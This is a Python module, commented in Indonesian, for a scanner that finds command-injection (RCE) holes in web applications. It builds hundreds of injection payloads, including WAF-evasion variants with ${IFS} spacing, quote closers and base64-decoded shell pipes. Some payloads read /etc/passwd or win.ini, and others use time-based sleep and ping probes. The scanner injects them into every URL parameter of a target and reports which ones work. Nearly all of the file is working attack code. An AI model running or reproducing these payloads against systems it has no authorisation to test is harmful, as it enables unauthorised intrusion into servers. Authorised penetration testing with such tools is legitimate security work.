import requests
import time
import urllib.parse
import copy
import string
import random
import base64
from colorama import Fore, Style

class PayloadGenerator:
    """
    Engine untuk menghasilkan variasi payload RCE secara dinamis
    guna melewati filter (WAF) dan sanitasi input.
    """
    def __init__(self):
        self.separators = [';', '|', '&&', '||', '\n', '%0a']
        self.closers = ['', "'", '"', "')", '")'] # Context breaking
        self.space_replacers = [' ', '${IFS}', '%09', '\t', '<']
        
        # Command dasar untuk deteksi
        self.base_commands_linux = [
            ("id", "uid="),
            ("cat /etc/passwd", "root:"),
            ("uname -a", "Linux"),
            ("set", "PATH=")
        ]
        self.base_commands_windows = [
            ("ver", "Microsoft Windows"),
            ("whoami", "\\"),
            ("echo %OS%", "Windows_NT"),
            ("type C:\\Windows\\win.ini", "extensions")
        ]

    def generate_reflected_payloads(self):
        """Menghasilkan ratusan kombinasi payload"""
        payloads = []
        
        # 1. LINUX GENERATOR
        for cmd, sig in self.base_commands_linux:
            for sep in self.separators:
                for close in self.closers:
                    # Pola: [CLOSER] [SEP] [CMD]
                    payload_str = f"{close}{sep}{cmd}"
                    payloads.append({'os': 'Linux', 'payload': payload_str, 'sig': sig, 'type': 'Standard'})
                    
                    # Pola Evasion: Mengganti spasi dengan ${IFS}
                    if ' ' in cmd:
                        cmd_evasion = cmd.replace(' ', '${IFS}')
                        payload_evasion = f"{close}{sep}{cmd_evasion}"
                        payloads.append({'os': 'Linux', 'payload': payload_evasion, 'sig': sig, 'type': 'WAF-Bypass (IFS)'})

                    # Pola Encoding: Base64 Wrapper
                    # echo 'base64...' | base64 -d | sh
                    b64_cmd = base64.b64encode(cmd.encode()).decode()
                    payload_b64 = f"{close}{sep}echo {b64_cmd}|base64 -d|sh"
                    payloads.append({'os': 'Linux', 'payload': payload_b64, 'sig': sig, 'type': 'Encoded-Bypass'})

        # 2. WINDOWS GENERATOR
        for cmd, sig in self.base_commands_windows:
            for sep in ['&', '&&', '|', '||']:
                for close in self.closers:
                    payload_str = f"{close}{sep}{cmd}"
                    payloads.append({'os': 'Windows', 'payload': payload_str, 'sig': sig, 'type': 'Standard'})

        return payloads

    def generate_blind_payloads(self, delay=5):
        """Payload untuk Time-Based Blind Injection"""
        payloads = []
        
        # Linux Sleep
        sleep_cmds = [f"sleep {delay}", f"/bin/sleep {delay}"]
        for cmd in sleep_cmds:
            for sep in self.separators:
                payloads.append({'os': 'Linux', 'payload': f"{sep}{cmd}", 'delay': delay})
        
        # Windows Ping (Ping -n delay+1)
        ping_cmd = f"ping -n {delay+1} 127.0.0.1"
        for sep in ['&', '&&', '|']:
            payloads.append({'os': 'Windows', 'payload': f"{sep}{ping_cmd}", 'delay': delay})
            
        return payloads


class CommandInjectionEngine:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'ZeroBurst-RCE-Scanner/12.0 (Deep-Inspect)',
            'Accept': '*/*'
        }
        
        self.parsed = urllib.parse.urlparse(target_url)
        self.params = urllib.parse.parse_qs(self.parsed.query)
        self.base_url = target_url.split("?")[0]
        self.generator = PayloadGenerator()

    def measure_latency(self, url):
        """Mengukur waktu respon server"""
        start = time.time()
        try:
            self.session.get(url, timeout=20)
        except:
            return 999 # Timeout dianggap delay sangat lama
        return time.time() - start

    def run_scan(self):
        print(f"\n{Fore.CYAN}[*] MODULE START: Deep RCE Hunter (Context-Aware & Evasion){Style.RESET_ALL}")
        print(f"{Fore.WHITE}[*] Target: {Fore.GREEN}{self.target}")
        
        if not self.params:
            print(f"{Fore.RED}[!] No parameters detected. Cannot inject.")
            return

        # 1. BASELINE CHECK
        print(f"{Fore.YELLOW}[+] Measuring Baseline Latency & Stability...{Style.RESET_ALL}")
        baseline_latency = self.measure_latency(self.target)
        print(f"   └── Average Response: {baseline_latency:.2f}s")
        
        total_vulns = 0

        # 2. PARAMETER FUZZING LOOP
        for param, values in self.params.items():
            print(f"\n{Fore.WHITE}>>> Inspecting Parameter: {Fore.GREEN}'{param}'{Style.RESET_ALL}")
            original_val = values[0]
            
            # --- FASE 1: REFLECTED INJECTION (Output Based) ---
            print(f"   {Fore.CYAN}[Phase 1] Testing Reflected RCE (Standard & WAF Bypass)...{Style.RESET_ALL}")
            reflected_payloads = self.generator.generate_reflected_payloads()
            
            phase1_success = False
            for p_data in reflected_payloads:
                # Construct URL
                new_params = copy.deepcopy(self.params)
                # Strategi: Append payload ke nilai asli
                new_params[param] = [original_val + p_data['payload']]
                query = urllib.parse.urlencode(new_params, doseq=True)
                attack_url = f"{self.base_url}?{query}"
                
                try:
                    res = self.session.get(attack_url, timeout=8)
                    
                    # Analisis Output
                    if p_data['sig'] in res.text:
                        print(f"      {Fore.RED}[CRITICAL] RCE CONFIRMED!{Style.RESET_ALL}")
                        print(f"      ├── Payload Used: {Fore.YELLOW}{p_data['payload']}{Style.RESET_ALL}")
                        print(f"      ├── Technique   : {p_data['type']}")
                        print(f"      ├── OS Detected : {p_data['os']}")
                        print(f"      └── Evidence    : Found signature '{p_data['sig']}' in response")
                        phase1_success = True
                        total_vulns += 1
                        break # Stop fuzzing parameter ini jika sudah tembus
                except:
                    pass
            
            if phase1_success: continue # Lanjut ke parameter berikutnya

            # --- FASE 2: BLIND INJECTION (Time Based) ---
            print(f"   {Fore.CYAN}[Phase 2] Testing Blind RCE (Time-Based)...{Style.RESET_ALL}")
            blind_payloads = self.generator.generate_blind_payloads(delay=5)
            
            for p_data in blind_payloads:
                new_params = copy.deepcopy(self.params)
                new_params[param] = [original_val + p_data['payload']]
                query = urllib.parse.urlencode(new_params, doseq=True)
                attack_url = f"{self.base_url}?{query}"
                
                # Ukur latensi serangan
                latency = self.measure_latency(attack_url)
                
                # Logic: Jika latensi > (baseline + delay - 1 detik toleransi)
                if latency >= (baseline_latency + p_data['delay'] - 1):
                    # VERIFIKASI ULANG (False Positive Check)
                    # Kita tes ulang untuk memastikan bukan kebetulan lag
                    print(f"      {Fore.YELLOW}[?] Potential Time-Delay detected ({latency:.2f}s). Verifying...{Style.RESET_ALL}")
                    verify_latency = self.measure_latency(attack_url)
                    
                    if verify_latency >= (baseline_latency + p_data['delay'] - 1):
                        print(f"      {Fore.RED}[CRITICAL] BLIND RCE CONFIRMED!{Style.RESET_ALL}")
                        print(f"      ├── Payload Used: {p_data['payload']}")
                        print(f"      ├── OS Family   : {p_data['os']}")
                        print(f"      └── Timing      : Attack took {verify_latency:.2f}s (Expected > {p_data['delay']}s)")
                        total_vulns += 1
                        break
        
        # 3. SUMMARY
        print("-" * 60)
        if total_vulns > 0:
            print(f"{Fore.RED}[!!!] SCAN COMPLETE: {total_vulns} Parameter(s) Vulnerable to RCE.{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[OK] SCAN COMPLETE: No RCE vectors found.{Style.RESET_ALL}")

def run_cmd_scan(url):
    engine = CommandInjectionEngine(url)
    engine.run_scan()